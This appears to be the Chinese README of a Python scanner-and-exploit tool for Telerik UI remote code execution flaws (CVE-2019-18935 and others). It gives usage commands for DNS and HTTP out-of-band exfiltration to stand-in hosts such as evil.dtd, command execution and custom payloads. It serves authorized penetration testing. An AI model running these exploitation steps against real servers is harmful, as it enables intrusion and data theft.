# Telerik UI RCE 漏洞扫描与利用工具

## 功能概述

这是一个增强版的 Telerik UI 远程代码执行漏洞扫描工具，支持多种测试模式和自定义配置。

## 新增功能

### 1. 多模式测试
- **自动检测**: 完整的漏洞检测流程
- **自定义测试**: 支持特定类型的测试
- **漏洞利用**: 尝试实际的漏洞利用

### 2. 自定义参数配置
- DNS外带测试配置
- HTTP外带测试配置  
- 命令执行测试
- 自定义Payload测试

### 3. 详细日志输出
- 时间戳记录
- 多级别日志
- 文件输出支持
- 详细模式开关

### 4. 结果导出
- JSON格式结果输出
- 漏洞详情汇总
- 测试结果统计

## 使用方法

### 基本扫描
```bash
python 1.py -u http://target.com
```

### 指定测试类型
```bash
# 只检测组件
python 1.py -u http://target.com -t detection

# 只测试文件上传
python 1.py -u http://target.com -t file_upload

# 只测试漏洞利用
python 1.py -u http://target.com -t exploit
```

### 自定义测试
```bash
# DNS外带测试
python 1.py -u http://target.com -c dns -d your-domain.com

# HTTP外带测试
python 1.py -u http://target.com -c http -http http://your-server.com/payload.dtd

# 命令执行测试
python 1.py -u http://target.com -c command -cmd "whoami"

# 自定义Payload测试
python 1.py -u http://target.com -c custom -p "<your_xml_payload>"
```

### 高级选项
```bash
# 启用详细模式
python 1.py -u http://target.com -v

# 设置超时时间
python 1.py -u http://target.com -to 60

# 输出结果到文件
python 1.py -u http://target.com -o result.txt
```

## 参数说明

| 参数 | 说明 | 默认值 |
|------|------|--------|
| `-u, --url` | 目标URL | 必填 |
| `-t, --test-type` | 测试类型: all, detection, async_upload, serialization, file_upload, exploit | all |
| `-c, --custom-test` | 自定义测试类型: dns, http, command, custom | - |
| `-p, --payload` | 自定义Payload | - |
| `-d, --dns-domain` | DNS外带域名 | example.com |
| `-http, --http-url` | HTTP外带URL | http://example.com/evil.dtd |
| `-cmd, --command` | 执行的命令 | whoami |
| `-o, --output` | 输出文件 | - |
| `-v, --verbose` | 详细模式 | false |
| `-to, --timeout` | 请求超时时间(秒) | 30 |

## 测试类型说明

### 1. 组件检测 (detection)
检测目标是否使用 Telerik UI 组件，检查常见路径：
- `/Telerik.Web.UI.WebResource.axd`
- `/WebResource.axd`
- `/ScriptResource.axd`
- `/Telerik.Web.UI.DialogHandler.aspx`
- `/Telerik.Web.UI.SpellCheckHandler.axd`
- `/Telerik.Web.UI.AsyncUploadHandler.axd`

### 2. AsyncUpload组件检测 (async_upload)
检测 RadAsyncUpload 组件是否存在

### 3. 序列化漏洞测试 (serialization)
测试 .NET 序列化漏洞

### 4. 文件上传测试 (file_upload)
测试文件上传功能

### 5. 漏洞利用测试 (exploit)
尝试实际的漏洞利用：
- DNS外带数据
- HTTP外带数据
- 命令执行

## 输出示例

```
[2025-08-31 10:30:45] [INFO] 开始测试目标: http://target.com
[2025-08-31 10:30:45] [INFO] 漏洞名称: Progress Telerik UI 远程代码执行漏洞
[2025-08-31 10:30:45] [INFO] CVE编号: CVE-2019-18935, CVE-2017-11317, CVE-2017-11357
[2025-08-31 10:30:45] [INFO] 影响版本: 2007.2.607.0 - 2019.3.1023.0
```

## 安全提示

1. 仅在授权测试的环境中使用本工具
2. 测试前确保获得目标系统的明确授权
3. 不要对生产环境进行未经授权的测试
4. 测试结果仅供参考，需要人工验证

## 免责声明

本工具仅用于安全研究和授权测试目的。使用者应对其行为负责，作者不对任何误用或损坏负责。

## 版本信息

- 版本: 2.0 (增强版)
- 更新: 添加了自定义测试、漏洞利用、结果导出等功能
- 作者: Mickey
- 日期: 2025-09-01

